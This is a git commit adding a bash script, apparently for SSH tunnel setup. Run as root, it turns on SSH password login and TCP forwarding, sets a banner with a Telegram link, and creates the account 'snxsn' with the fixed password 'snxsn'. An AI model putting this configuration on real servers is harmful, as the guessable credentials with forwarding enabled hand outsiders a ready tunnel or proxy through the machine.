03f6ed36a35e67f85f50700670bf39fea94b93ea
SN <50373900+mlulinX@users.noreply.github.com>
2023-09-12 01:37:34 +0630

    Create authsn.sh

---
+++ authsn.sh
@@ -0,0 +1,33 @@
+#!/bin/bash
+
+plain='\033[0m'
+
+red='\e[31m'
+yellow='\e[33m'
+gray='\e[90m'
+green='\e[92m'
+blue='\e[94m'
+magenta='\e[95m'
+cyan='\e[96m'
+none='\e[0m'
+# Font Size
+# h6 = SMALL , h4 = AVERAGE , h3 = LARGE
+# Check Root
+[[ $EUID -ne 0 ]] && echo -e "${red}Error: ${plain} You must use root user to run this script!\n" && exit 1
+
+sed -i 's/#\?AllowTcpForwarding .*/AllowTcpForwarding yes/' /etc/ssh/sshd_config && sed -i 's/#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sed -i 's/#\?Banner .*/Banner \/etc\/ssh\/sngcp/' /etc/ssh/sshd_config && /etc/init.d/ssh restart;
+echo "
+<h4><font color='cyan'>Telegram >> https://t.me/mlulinX
+</font></h4>
+
+
+</font></h3>" | tee /etc/ssh/sngcp >/dev/null
+useradd "snxsn" --shell=/bin/false -M
+echo "snxsn:snxsn" | chpasswd
+
+echo ""
+
+echo -e "${yellow}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ${plain}"
+echo -e "${yellow}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ${plain}"
+
+echo -e "${cyan} Successful Authentication ${plain}"
